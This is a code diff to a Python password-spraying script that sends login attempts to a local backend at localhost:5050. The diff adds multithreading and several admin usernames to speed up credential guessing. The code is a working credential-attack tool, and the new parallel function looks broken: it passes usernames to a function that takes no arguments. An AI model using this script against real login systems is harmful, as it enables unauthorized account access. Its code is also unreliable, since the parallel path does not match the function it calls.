@@ -1,4 +1,5 @@
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 # Set the correct target URL for the login endpoint on your backend
 url = "http://localhost:5050/login"
@@ -11,7 +12,10 @@ headers = {
 
 # List of usernames for password spraying
 usernames = [
-    'admin'
+    'admin',
+    'admin2',
+    'admin3',
+    'admin4'
 ]
 
 # The password you want to use for spraying
@@ -43,6 +47,12 @@ def password_spray():
             print(f"[-] Failed login for {username} (Status Code: 403 Forbidden)")
         else:
             print(f"[-] Failed login for {username} (Status Code: {response.status_code})")
+
+# Function to run password spraying in parallel
+def password_spray_parallel():
+    # Using ThreadPoolExecutor to manage a pool of threads
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        executor.map(password_spray, usernames)
 
 # Run the password spray
 if __name__ == "__main__":
